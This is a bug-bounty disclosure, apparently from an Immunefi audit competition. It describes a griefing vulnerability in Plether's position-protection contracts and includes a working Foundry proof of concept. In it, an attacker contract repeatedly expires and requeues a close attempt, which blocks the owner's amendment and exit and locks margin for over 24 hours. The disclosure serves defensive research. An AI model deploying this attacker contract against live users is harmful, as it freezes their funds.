# \#98712 [SC-High] Anyone can hold a triggered protection out of Latched and block the owner amendment and exit for over a day

**Submitted on Nov 9th 2026 at 18:45:52 UTC by @tchoupilou for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98712
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description


## Brief/Intro

The permissionless retry is intended. `SECURITY.md:550` states "Retry is permissionless and validates the latest child/reverse mapping", `CANONICAL_ENTRYPOINTS.md:142-144` says a latched trigger "may be retried permissionlessly" and `WORKING_WITH_AI_AGENTS.md:266` lists the entrypoint as one that "Permissionlessly queues a new attempt for `Latched` protection". This report is not about that property.

The same project promises the owner a remedy for a protection whose ceilings are too tight. `CANONICAL_ENTRYPOINTS.md:145-147` says "The owner may amend the close ceilings of a `Latched` protection with `PositionProtectionBook.amendLatchedPositionProtectionCloseLimits(uint64,CloseFinancialLimits)` when the account has no pending Router order", and `WORKING_WITH_AI_AGENTS.md:284` places the amendment before the retry in the owner's sequence. The Cecuro MED-9 disposition is explicit on both halves, "Only the owner may amend the retained ceilings while protection is Latched" and "Tight limits may prevent execution until conditions improve or the owner amends them".

The permissionless retry carries no delay and reserves no window for that amendment, and the two paths are not symmetric. The retry resolves its record without any caller check, so an attacker contract ends the expired attempt and queues a new one in a single call. The amendment is bound to the protected account itself, so an owner holding an externally owned account cannot batch the same two steps. For as long as the attacker funds one call per execution window the owner never reaches the state in which the documented remedy applies, the account trade lock refuses every ordinary order, and the margin locked in the position is not withdrawable.

## Vulnerability Details

`amendLatchedPositionProtectionCloseLimits` resolves the record with `_ownedActiveProtection(protectionId, msg.sender)` at `PositionProtectionBook.sol:319`, and that helper reverts `OrderRouter__Unauthorized` when `protection.account != account` at `:983-991`. The caller must therefore be the protected account itself. The function then requires the `Latched` status at `:320-322` and reverts `OrderRouter__PendingOrdersExist` when `pendingOrderCounts(msg.sender) != 0` at `:323-325`.

`retryPositionProtectionClose` at `:382-406` resolves its record with `_activeProtection(protectionId)` at `:385`, which compares no caller at `:993-1000`. Any address may call it, including a contract acting on its own behalf against someone else's protection. `OrderRouter.expireOrder` at `:191` carries no access modifier either and needs no oracle data, and unlike `executeOrder` at `:240-247` it does not operate on the global queue head, so the attacker does not depend on the victim's attempt sitting at that head. An attacker contract can therefore terminalise the expired attempt and queue a fresh retry atomically, while an owner whose account is an externally owned account must send two separate transactions and can be preempted in the window between them. An owner whose protected account is itself a contract can batch the same two steps and is not exposed in the same way.

No other exit exists while the protection holds the account. `_cancel` requires `PendingOpen` or `Armed` at `:414-419` and `_replace` carries the same guard at `:272-277`. `cancelPositionProtectionAndCommitClose` requires `Armed` at `:346`, which `SECURITY.md:544` restates as "Pending-open, triggered, and latched protections cannot use this action". An ordinary order is refused because `OrderLiquidationBatchLogic` passes `enforceProtectionLock = true` at `:135` and reverts `OrderRouter__ProtectionActive` at `:313-315` while `activePositionProtectionId(account)` is nonzero. `SECURITY.md:547-548` describes that state as one where "the trigger evidence and account trade lock remain but no child is live".

The cadence the trader cannot shorten comes from one governed parameter. `OrderLiquidationBatchLogic.sol:670` assigns `request.bounds.executionWindowSeconds = uint32(host.maxExecutionWindowSeconds())`, so every protection close attempt takes the router maximum rather than a value the trader chooses, and `:673` sets `maxExecutionBountyAssets = 0`, so the work the attacker triggers pays nobody. That maximum starts at 60 through `DEFAULT_MAX_EXECUTION_WINDOW_SECONDS` at `src/router/OrderExecutionOrchestrator.sol:11` and governance may raise it to `MAX_EXECUTION_WINDOW_SECONDS_LIMIT = 1 hours` at `src/OrderRouterAdmin.sol:31`, enforced at `:341`.

Two bullets of the `Known Limitations` section of `SECURITY.md` touch this area and neither covers the amendment. The bullet at `:1356` records that "failed protection-attempt cleanup is deliberately unpaid" and the bullet at `:1358-1359` asks operators to alert on a prolonged `Latched` state without a live child. Both describe the risk that a retry is missing and that liveness depends on keepers appending one. The defect here is the opposite shape, a retry that is always present, so the prescribed alert condition is never met. The word amendment appears nowhere in `SECURITY.md`.

Cecuro MED-9 is the closest audit entry and its `Locations` include `OrderLiquidationBatchLogic.sol:178-192`. That finding is about keepers retrying without the trader's ceilings, and its fix is the retained ceilings plus the owner amendment quoted above. This report does not dispute the retention. It shows that the amendment the fix relies on can be denied by any address.

## Impact Details

A position whose close ceilings are too tight for current conditions is held open by any unprivileged address, and its owner can neither widen the ceilings nor close the position by hand while that holds.

The proof of concept measures the lockout rather than extrapolating it. The duration test sustains 1500 attacker calls covering 91500 seconds, which is over 25 hours, and the loop ends at its own bound rather than on a failure. At every cycle the owner's amendment reverts `OrderRouter__ProtectionNotLatched` and the owner's ordinary close reverts `OrderRouter__ProtectionActive`, both pinned by selector. At the end the position is still at its full opening size of 10000000000000000000000.

Funds are locked, not merely orders refused. At the end of the lockout the owner holds a settlement balance of 19995800000 of which 1986000000 is margin locked in the position. A withdrawal of the full balance reverts `MarginClearinghouse__InsufficientBalance`, and a withdrawal that would leave exactly that locked margin behind reverts `MarginClearinghouse__InsufficientFreeEquity` at `MarginClearinghouse.sol:470`, so the withdrawal guard refuses it as well. The balance is unchanged after both attempts, which the test asserts. The amount out of reach is therefore at least the 1986000000 of locked margin, and that margin can only be released by closing the position, which is exactly what the lockout prevents.

The attacker spends only gas, with no capital at risk and no bounty paid to anyone. The measured cost is 1096555 gas per call on the long series and 1097141 on the short one, so the 25 hours cost near 1.64 billion gas. Those figures come from a build with the optimizer disabled and from a `gasleft()` delta inside the test, so they exclude the intrinsic transaction cost and the calldata cost and they overstate what an optimized deployment charges.

Without the attacker the same owner amends the ceilings and the stored ceilings change, which the final step of the first test shows.

## References

- `src/PositionProtectionBook.sol` [:272-277](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L272-L277) [:319](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L319) [:320-325](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L320-L325) [:346](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L346) [:382-406](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L382-L406) [:385](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L385) [:414-419](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L414-L419) [:983-991](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L983-L991) [:993-1000](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L993-L1000)
- `src/router/OrderLiquidationBatchLogic.sol` [:135](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L135) [:313-315](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L313-L315) [:657-680](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L657-L680) [:670](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L670) [:673](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L673)
- `src/router/OrderExecutionOrchestrator.sol` [:11](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderExecutionOrchestrator.sol#L11)
- `src/OrderRouterAdmin.sol` [:31](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterAdmin.sol#L31) [:341](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterAdmin.sol#L341)
- `src/OrderRouter.sol` [:191](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L191) [:240-247](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L240-L247)
- `src/MarginClearinghouse.sol` [:414](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/MarginClearinghouse.sol#L414) [:450](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/MarginClearinghouse.sol#L450) [:470](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/MarginClearinghouse.sol#L470)
- `SECURITY.md` [:544](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L544) [:547-548](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L547-L548) [:550](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L550) [:1356](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L1356) [:1358-1359](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L1358-L1359)
- `CANONICAL_ENTRYPOINTS.md` [:65](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/CANONICAL_ENTRYPOINTS.md#L65) [:142-144](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/CANONICAL_ENTRYPOINTS.md#L142-L144) [:145-147](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/CANONICAL_ENTRYPOINTS.md#L145-L147)
- `WORKING_WITH_AI_AGENTS.md` [:266](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WORKING_WITH_AI_AGENTS.md#L266) [:284](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WORKING_WITH_AI_AGENTS.md#L284)
- Cecuro audit report, MED-9 disposition and its `Locations` : [plether-ai-audit-report-2026-10-26.pdf](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf)

## Proof of Concept

The test inherits the project's own `PositionProtectionTest` fixture, so the Router, the Engine, the oracle and the protection Book are the project contracts rather than mocks. The only contract added is the attacker, which calls nothing but public permissionless entrypoints, and an ordinary externally owned account drives it. Time advances only through the real execution deadlines read from the lifecycle book. `TIGHT_ACTION_CHARGE` is set to one six decimal unit so that every close attempt fails deterministically. The raised gas limit is an execution flag only. It is needed because a single Foundry test transaction otherwise runs out of gas around the twelfth hour while the lockout is still in force.

Command, from `packages/perps`.

    FOUNDRY_VIA_IR=false FOUNDRY_OPTIMIZER=false forge test \
      --match-contract RetryAmendLockoutE2ETest -vv --threads 1 --gas-limit 30000000000

File `packages/perps/test/perps/zz_hunt/RetryAmendLockoutE2E.t.sol`.

    // SPDX-License-Identifier: AGPL-3.0
    pragma solidity 0.8.35;

    import {PositionProtectionTest} from "../spec/trader/PositionProtection.t.sol";

    import {CfdTypes} from "@plether/perps/CfdTypes.sol";
    import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
    import {IMarginClearinghouse} from "@plether/perps/interfaces/IMarginClearinghouse.sol";
    import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
    import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
    import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
    import {console} from "forge-std/console.sol";

    interface IRouterExecute {

        /// @dev `expireOrder` est sans permission et INDEPENDANT de la tete de file globale,
        ///      contrairement a `executeOrder` dont la NatSpec parle d'un « eligible global queue head ».
        function expireOrder(
            uint64 orderId
        ) external returns (OrderV3Types.ExecutionResult memory result);

    }

    /// @notice L'attaquant n'est pas un mock : c'est un contrat qui n'appelle que des entrypoints PUBLICS et
    ///         SANS PERMISSION. Il termine la tentative perimee et en relance aussitot une autre dans la MEME
    ///         transaction, de sorte que le proprietaire n'observe jamais un etat `Latched` a file vide.
    contract RetryLockoutAttacker {

        IRouterExecute internal immutable ROUTER;
        IPositionProtectionActions internal immutable ACTIONS;

        constructor(
            address router_,
            address actions_
        ) {
            ROUTER = IRouterExecute(router_);
            ACTIONS = IPositionProtectionActions(actions_);
        }

        /// @dev un seul appel : [terminaliser l'ancienne tentative] + [relancer] -> aucune fenetre inter-transaction
        function denyWindow(
            uint64 staleOrderId,
            uint64 protectionId
        ) external returns (uint64 freshOrderId) {
            ROUTER.expireOrder(staleOrderId);
            freshOrderId = ACTIONS.retryPositionProtectionClose(protectionId);
        }

    }

    contract RetryAmendLockoutE2ETest is PositionProtectionTest {

        uint256 internal constant TIGHT_ACTION_CHARGE = 1; // 1 unite de 6 decimales : plafond intenable
        uint256 internal constant CYCLES = 24;
        uint256 internal constant CYCLES_MAX = 1500;

        function _tightParams() internal pure returns (PositionProtectionTypes.PositionProtectionParams memory params) {
            params.takeProfitTriggerPrice = LONG_TAKE_PROFIT;
            params.stopLossTriggerPrice = 0;
            params.closeLimits = PositionProtectionTypes.CloseFinancialLimits({
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: TIGHT_ACTION_CHARGE,
                maxExplicitFeesAssets: type(uint256).max
            });
        }

        function _relaxedLimits() internal pure returns (PositionProtectionTypes.CloseFinancialLimits memory limits) {
            limits = PositionProtectionTypes.CloseFinancialLimits({
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max
            });
        }

        function test_thirdPartyKeepsTheOwnerLockedOutOfItsOwnAmendment() public {
            // --- 1. ALICE ouvre et arme une protection dont le plafond de charge est intenable
            _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
            vm.prank(ALICE);
            uint64 protectionId = protectionActions.createPositionProtection(_tightParams());

            // --- 2. le declenchement est atteint : la cloture entre en file
            uint64 attemptId = _triggerAt(protectionId, LONG_TAKE_PROFIT);

            RetryLockoutAttacker attacker = new RetryLockoutAttacker(address(router), address(protectionActions));

            uint256 start = block.timestamp;
            uint256 attackerGas;
            uint256 done;

            // --- 3. CYCLES tours, chacun avec de VRAIS entrypoints seulement
            for (uint256 i; i < CYCLES; ++i) {
                // le temps passe jusqu'a l'expiration de la tentative en cours (fenetre reelle du protocole)
                if (
                    protectionViews.getPositionProtection(protectionId).status
                        != PositionProtectionTypes.PositionProtectionStatus.Triggered
                ) {
                    break;
                }
                uint64 deadline = router.lifecycleBook().orderTiming(attemptId).executionDeadline;
                assertGt(deadline, block.timestamp, "la tentative doit etre vivante avant son expiration");
                vm.warp(uint256(deadline) + 1);
                vm.roll(block.number + 1);
                // en production les keepers rafraichissent la marque en continu, ce tour le modelise
                router.updateMarkPrice(_livePriceData(LONG_TAKE_PROFIT));

                // l'attaquant ferme la fenetre : terminalisation + relance dans UNE transaction
                // n'importe quelle EOA pilote le contrat attaquant : aucun droit, aucun bounty
                vm.prank(CAROL);
                uint256 gasBefore = gasleft();
                try attacker.denyWindow(attemptId, protectionId) returns (uint64 fresh) {
                    attemptId = fresh;
                    attackerGas += gasBefore - gasleft();
                } catch {
                    break;
                }

                // l'invariant qui porte le finding : la protection n'est JAMAIS rendue a l'etat Latched,
                // le seul ou l'amendement est permis
                assertTrue(
                    protectionViews.getPositionProtection(protectionId).status
                        != PositionProtectionTypes.PositionProtectionStatus.Latched,
                    "l'attaquant maintient la protection hors de Latched"
                );

                // le proprietaire ne peut PAS corriger ses plafonds
                vm.prank(ALICE);
                vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
                protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _relaxedLimits());

                // ni sortir par un ordre ordinaire : le compte est verrouille par la protection active
                vm.prank(ALICE);
                vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
                router.commitOrder(CfdTypes.Side.LONG, POSITION_SIZE, 0, 0, true);

                done = i + 1;
            }

            uint256 elapsed = block.timestamp - start;
            uint256 perCycle = elapsed / done;
            (uint256 size,,,,,,) = engine.positions(ALICE);
            console.log("== tours REELLEMENT soutenus              ", done);
            console.log("== taille de position restante            ", size);
            console.log(
                "== statut final de la protection (enum)   ",
                uint8(protectionViews.getPositionProtection(protectionId).status)
            );
            console.log("== plafond de tours demande              ", CYCLES);
            console.log("== duree couverte (secondes)              ", elapsed);
            console.log("== secondes par tour (= fenetre d'execution)", perCycle);
            console.log("== tx necessaires pour 24 h, config defaut ", perCycle == 0 ? 0 : 86_400 / perCycle);
            console.log("== tx necessaires pour 24 h si gouvernance met 1 h", uint256(24));
            console.log("== gas total consomme par l'attaquant      ", attackerGas);
            console.log("== gas par tour                            ", attackerGas / CYCLES);
            console.log("== gas pour tenir 24 h a la config defaut  ", (attackerGas / CYCLES) * (86_400 / perCycle));
            console.log("== cout par tx : gas seul, aucun droit, aucun bounty, aucun capital");

            // ce qui est PROUVE : le verrouillage tient a chaque tour, et sa cadence est la fenetre d'execution
            assertEq(perCycle, 61, "cadence mesuree : une tx par fenetre d'execution de 60 s + 1");

            // --- 4. temoin : sans attaquant, le proprietaire amende et la cloture passe
            if (
                protectionViews.getPositionProtection(protectionId).status
                    != PositionProtectionTypes.PositionProtectionStatus.Triggered
            ) {
                return;
            }
            uint64 witnessDeadline = router.lifecycleBook().orderTiming(attemptId).executionDeadline;
            vm.warp(uint256(witnessDeadline) + 1);
            vm.roll(block.number + 1);
            vm.prank(EXECUTION_KEEPER);
            router.executeOrder(attemptId, new bytes[](0));
            vm.prank(ALICE);
            protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _relaxedLimits());
            _assertStoredCloseLimits(protectionId, _relaxedLimits());
        }

        /// @notice Mesure la duree que l'attaquant peut soutenir. La boucle s'arrete d'elle-meme si le retry
        ///         cesse d'etre possible, et le test rend alors la duree REELLEMENT atteinte.
        function test_lockoutDurationSustained() public {
            _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
            vm.prank(ALICE);
            uint64 protectionId = protectionActions.createPositionProtection(_tightParams());

            uint64 attemptId = _triggerAt(protectionId, LONG_TAKE_PROFIT);
            RetryLockoutAttacker attacker = new RetryLockoutAttacker(address(router), address(protectionActions));

            uint256 start = block.timestamp;
            uint256 attackerGas;
            uint256 done;

            for (uint256 i; i < CYCLES_MAX; ++i) {
                uint64 deadline = router.lifecycleBook().orderTiming(attemptId).executionDeadline;
                if (deadline <= block.timestamp) {
                    break;
                }
                vm.warp(uint256(deadline) + 1);
                vm.roll(block.number + 1);
                router.updateMarkPrice(_livePriceData(LONG_TAKE_PROFIT));

                vm.prank(CAROL);
                uint256 gasBefore = gasleft();
                try attacker.denyWindow(attemptId, protectionId) returns (uint64 fresh) {
                    attemptId = fresh;
                    attackerGas += gasBefore - gasleft();
                } catch {
                    break;
                }

                vm.prank(ALICE);
                vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
                protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _relaxedLimits());

                vm.prank(ALICE);
                vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
                router.commitOrder(CfdTypes.Side.LONG, POSITION_SIZE, 0, 0, true);

                done = i + 1;
            }

            uint256 elapsed = block.timestamp - start;
            (uint256 size, uint256 lockedMargin,,,,,) = engine.positions(ALICE);
            // le solde total du proprietaire n'est PAS retirable : la marge de la position est verrouillee
            // dans une position qu'il ne peut ni fermer ni amender
            uint256 totalBalance = clearinghouse.balanceAssets(ALICE);
            vm.prank(ALICE);
            vm.expectRevert(IMarginClearinghouse.MarginClearinghouse__InsufficientBalance.selector);
            clearinghouse.withdrawMargin(totalBalance);
            // meme un retrait qui laisserait exactement la marge de la position derriere lui est refuse,
            // par la garde de retrait et non par le solde : le montant hors d'atteinte est AU MOINS cette marge
            vm.prank(ALICE);
            vm.expectRevert(IMarginClearinghouse.MarginClearinghouse__InsufficientFreeEquity.selector);
            clearinghouse.withdrawMargin(totalBalance - lockedMargin);
            console.log("== solde total du proprietaire             ", totalBalance);
            console.log("== retrait du solde total                   refuse InsufficientBalance");
            console.log("== retrait de total moins la marge          refuse InsufficientFreeEquity");
            console.log("== marge immobilisee dans la position      ", lockedMargin);
            console.log("== tours soutenus                          ", done);
            console.log("== duree de verrouillage mesuree (secondes)", elapsed);
            console.log("== duree de verrouillage mesuree (heures)  ", elapsed / 3600);
            console.log("== taille de position encore ouverte       ", size);
            console.log("== gas par tour sur longue serie           ", done == 0 ? 0 : attackerGas / done);

            assertGt(done, 0, "au moins un tour soutenu");
            assertGe(elapsed, 24 hours, "verrouillage mesure au-dela de 24 heures");
            assertEq(size, POSITION_SIZE, "la position reste ouverte pendant tout le verrouillage");
            assertGt(lockedMargin, 0, "de la marge reste immobilisee dans une position non fermable");
            assertGe(totalBalance, lockedMargin, "le solde total couvre la marge verrouillee");
            assertEq(clearinghouse.balanceAssets(ALICE), totalBalance, "aucun retrait n'a abouti pendant le verrouillage");
        }

    }

Output, abridged to the two tests of this report out of the 106 that the command runs.

    Ran 106 tests for test/perps/zz_hunt/RetryAmendLockoutE2E.t.sol:RetryAmendLockoutE2ETest
    [PASS] test_lockoutDurationSustained() (gas: 1935185399)
    Logs:
      == solde total du proprietaire              19995800000
      == retrait du solde total                   refuse InsufficientBalance
      == retrait de total moins la marge          refuse InsufficientFreeEquity
      == marge immobilisee dans la position       1986000000
      == tours soutenus                           1500
      == duree de verrouillage mesuree (secondes) 91500
      == duree de verrouillage mesuree (heures)   25
      == taille de position encore ouverte        10000000000000000000000
      == gas par tour sur longue serie            1096555

    [PASS] test_thirdPartyKeepsTheOwnerLockedOutOfItsOwnAmendment() (gas: 28625252)
    Logs:
      == tours REELLEMENT soutenus               24
      == taille de position restante             10000000000000000000000
      == statut final de la protection (enum)    3
      == plafond de tours demande               24
      == duree couverte (secondes)               1464
      == secondes par tour (= fenetre d'execution) 61
      == tx necessaires pour 24 h, config defaut  1416
      == tx necessaires pour 24 h si gouvernance met 1 h 24
      == gas total consomme par l'attaquant       26331404
      == gas par tour                             1097141
      == gas pour tenir 24 h a la config defaut   1553551656
      == cout par tx : gas seul, aucun droit, aucun bounty, aucun capital

    Suite result: ok. 106 passed; 0 failed; 0 skipped; finished in 14.75s (14.72s CPU time)

The run disables via-IR and the optimizer because the available machine cannot complete a via-IR compilation of this repository. Under those same settings the whole inherited `PositionProtectionTest` suite stays green together with these two tests, 106 passed and 0 failed, which is the control that the harness still measures the intended behaviour. The two transaction counts printed by the first test are arithmetic from the measured cadence. The duration that is measured is the one the second test reports.
